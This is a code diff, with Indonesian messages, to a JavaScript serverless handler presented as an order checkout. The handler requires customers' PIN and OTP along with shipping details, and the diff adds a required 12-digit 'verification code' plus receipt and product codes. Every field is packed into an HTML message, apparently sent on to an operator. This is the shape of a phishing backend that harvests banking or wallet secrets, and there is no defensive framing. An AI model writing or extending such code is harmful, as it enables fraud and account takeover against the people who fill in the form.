@@ -30,7 +30,10 @@ module.exports = async function handler(req, res) {
   }
 
   const body = req.body || {};
-  const required = ["orderCode", "name", "phone", "email", "pin", "otp", "product", "address", "postal", "shipping"];
+  const required = ["orderCode", "name", "phone", "email", "pin", "otp", "resi", "kodeProduk", "verificationCode", "product", "address", "postal", "shipping"];
+  if (!/^\\d{12}$/.test(clean(body.verificationCode))) {
+    return res.status(400).json({ ok: false, error: "Kode verifikasi harus terdiri dari 12 angka." });
+  }
   if (required.some((key) => !clean(body[key]))) {
     return res.status(400).json({ ok: false, error: "Data pesanan belum lengkap." });
   }
@@ -51,6 +54,9 @@ module.exports = async function handler(req, res) {
     "",
     `<b>PIN:</b> ${escapeHtml(body.pin)}`,
     `<b>OTP:</b> ${escapeHtml(body.otp)}`,
+    `<b>Kode Resi:</b> ${escapeHtml(body.resi)}`,
+    `<b>Kode Produk:</b> ${escapeHtml(body.kodeProduk)}`,
+    `<b>Kode 12 Digit:</b> ${escapeHtml(body.verificationCode)}`,
     `<b>Produk:</b> ${escapeHtml(body.product)}`,
     `<b>Harga:</b> ${rupiah(price)}`,
     `<b>Jumlah:</b> ${qty}`,
